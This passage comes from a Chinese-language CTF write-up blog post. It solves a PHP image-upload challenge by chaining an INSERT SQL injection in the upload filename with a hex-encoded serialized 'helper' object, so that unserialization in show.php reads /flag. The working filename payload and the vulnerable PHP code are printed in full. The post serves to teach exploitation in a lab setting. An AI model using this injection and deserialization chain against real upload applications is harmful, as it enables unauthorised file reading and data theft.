invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);<br>		&#125;<br>	    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<br>	    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data</span> || !<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>		&#125;<br>		<span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">insert_array</span>(<span class="hljs-variable">$data</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con</span>))<br>		&#123;<br>		    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>		&#125;<br>		<span class="hljs-variable">$sql_fields</span> = <span class="hljs-keyword">array</span>();<br>		<span class="hljs-variable">$sql_val</span> = <span class="hljs-keyword">array</span>();<br>		<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>			<span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br>			<span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br>			<span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br>			<span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>		&#125;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<br>		<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br>		<span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_insert_id</span>(<span class="hljs-variable">$con</span>);<br>		<span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ifview == False)&#123;<br>			<span class="hljs-keyword">return</span> False;<br>			<span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span><br>		&#125;<br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-comment"># Read some config html</span><br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">view_files</span>(<span class="hljs-variable">$this</span>-&gt;config);<br>	&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里的重点是helper.php</p>
+<p>在upload()函数中，会将相关信息保存在<code>$array</code>数组中，注意到有一个地方被序列化了：<code>$array[&quot;attr&quot;] = serialize($my_ext);</code> ，然后经过相关的检查会将<code>$array</code>数组插入到mysql数据库中去</p>
+<p>我们分析一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ifview == False)&#123;<br>			<span class="hljs-keyword">return</span> False;<br>			<span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span><br>		&#125;<br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>	&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment"># Read some config html</span><br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">view_files</span>(<span class="hljs-variable">$this</span>-&gt;config);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如果<code>$this-&gt;config=/flag</code>，并且<code>$this-&gt;ifview=true</code>的话，当helper对象会序列化就会读取flag的内容，并且输出，这是利用点。但默认值读不了flag，怎么读？</p>
+<p>我们需要构造一个特定值序列化后的串，然后经过<code>unserialize()</code>，当对象销毁就会输出flag</p>
+<p>哪里有反序列化函数？在show.php的<code>Get_All_Images()</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM images&quot;</span>;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;<br>		    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>())&#123;<br>		    	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;<br>		    		<span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br>					<span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$attr_temp</span>);<br>				&#125;<br>		        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;id=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; filename=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;filename&quot;</span>].<span class="hljs-string">&quot; path=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>		    &#125;<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>		    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;<br>		&#125;<br>		<span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$this</span>-&gt;con);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个函数会将传入的数组中的<code>attr</code>属性的值先替换一下然后反序列化，这个属性就是<code>helper.php</code>的<code>$array[&#39;attr&#39;]</code>经过序列化后的值，所以我们需要构造一下，将该值替换为恶意构造的序列化串</p>
+<p>但是<code>$array[&quot;attr&quot;]</code>默认的值是图片的宽高数组序列化后的值，没法控制输入</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$my</span>_ext = <span class="hljs-built_in">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;<span class="hljs-symbol">$img</span>_ext[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;<span class="hljs-symbol">$img</span>_ext[<span class="hljs-number">1</span>]);<br><span class="hljs-symbol">$array</span>[<span class="hljs-string">&quot;attr&quot;</span>] = serialize(<span class="hljs-symbol">$my</span>_ext);<br></code></pre></td></tr></table></figure>
+
+<p>怎么才能将自己的序列化串插入呢？我们注意到<code>insert_array()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		...<br>		<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>			<span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br>			<span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br>			<span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br>			<span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>		&#125;<br>		<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<br>		...<br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在这个函数中会执行sql语句，将输入插入到字符串，但是这里存在<strong>insert注入</strong></p>
+<p>我们查看<code>check()</code>函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$basename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">uniqid</span>()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);<br>		<span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>];<br>		<span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>		<span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br>		<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);<br>		&#125;<br>	    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<br>	    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里的<code>$title</code>从<code>$filename</code>传入，并且没有经过任何过滤，所以可以从这里入手，构造成这种格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">tit&#x27;,&#x27;fn&#x27;,&#x27;.png&#x27;,&#x27;path&#x27;,&#x27;O:&#123;yy&#125;&#x27;),(&#x27;title.png<br>即：<br>insert into images (`title`,`filename`,`ext`,`path`,`attr`)  values(&#x27;tit&#x27;,&#x27;fn&#x27;,&#x27;.png&#x27;,&#x27;path&#x27;,&#x27;O:&#123;yy&#125;&#x27;),(&#x27;title.png&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>这个序列化串如何构造呢？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$folder</span> = <span class="hljs-string">&quot;pic/&quot;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment"># O:6:&quot;helper&quot;:3:&#123;s:9:&quot; * folder&quot;;s:4:&quot;pic/&quot;;s:9:&quot; * ifview&quot;;b:1;s:9:&quot; * config&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311310402.png" srcset="/img/loading.gif" lazyload alt="image-20230731131038333"></p>
+<p>但是这里不能直接传入，因为变量是<code>protected</code>类型经过序列化后会加上<code>%00</code></p>
+<p>我们注意到之前<code>insert_array()</code>经过了替换：</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$value_temp = str_replace(<span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $value)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>所以我们替换成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;helper&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;\0\0\0folder&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pic/&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;\0\0\0ifview&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;\0\0\0config&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>总的filename就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">tit<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-function"><span class="hljs-keyword">fn</span>&#x27;,&#x27;.<span class="hljs-title">png</span>&#x27;,&#x27;<span class="hljs-title">path</span>&#x27;,&#x27;<span class="hljs-title">O</span>:6:&quot;<span class="hljs-title">helper</span>&quot;:3:</span>&#123;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;\0\0\0folder&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pic/&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;\0\0\0ifview&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;\0\0\0config&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<span class="hljs-string">&#x27;),(&#x27;</span>title.png<br></code></pre></td></tr></table></figure>
+
+<p>但是传过去发现无效，因为文件名双引号<code>&quot;</code>冲突了，我们可以将其转化为16进制：</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;helper&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;<span class="hljs-subst">\0</span><span class="hljs-subst">\0</span><span class="hljs-subst">\0</span>folder&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pic/&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;<span class="hljs-subst">\0</span><span class="hljs-subst">\0</span><span class="hljs-subst">\0</span>ifview&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;<span class="hljs-subst">\0</span><span class="hljs-subst">\0</span><span class="hljs-subst">\0</span>config&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br><br><span class="hljs-number">0x4f3a363a2268656c706572223a333a7b733a393a225c305c305c30666f6c646572223b733a343a227069632f223b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span><br></code></pre></td></tr></table></figure>
+
+<p>总的filename:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">tit<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-function"><span class="hljs-keyword">fn</span>&#x27;,&#x27;.<span class="hljs-title">png</span>&#x27;,&#x27;<span class="hljs-title">path</span>&#x27;,0<span class="hljs-title">x4f3a363a2268656c706572223a333a7b733a393a225c305c305c30666f6c646572223b733a343a227069632f223b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span>),(<span class="hljs-params"><span class="hljs-string">&#x27;title.png</span></span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311316941.png" srcset="/img/loading.gif" lazyload alt="image-20230731131622797"></p>
+<p>访问一下show.php，就会反序列化，输出flag：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311316705.png" srcset="/img/loading.gif" lazyload alt="image-20230731131648600"></p>
+<h3 id="mysql特性"><a href="#mysql特性" class="headerlink" title="mysql特性"></a>mysql特性</h3><p>这里有些同学会有些疑惑，为什么我们插入到数据库中的是序列化串的16进制形式：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x4f3a363a2268656c706572223a333a7b733a393a225c305c305c30666f6c646572223b733a343a227069632f223b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span><br></code></pre></td></tr></table></figure>
+
+<p>为什么后面反序列化还能成功？</p>
+<p>这是因为利用了mysql的特性</p>
+<p><strong>当mysql中插入一个16进制的值时会自动将其转化为字符串</strong></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202307311327731.png" srcset="/img/loading.gif" lazyload alt="image-20230731132712044"></p>
+<p>如图成功转为字符串，所以我们插入16进制就会转为字符串插入到数据库，这样取出来就可以成功反序列化啦</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://leekosss.github.io/2023/08/24/[安洵杯-不是文件上传]文件上传+insert注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年7月31日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5B%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023%5D%E5%A4%8D%E7%8E%B0/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5BWMCTF2023%5D/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
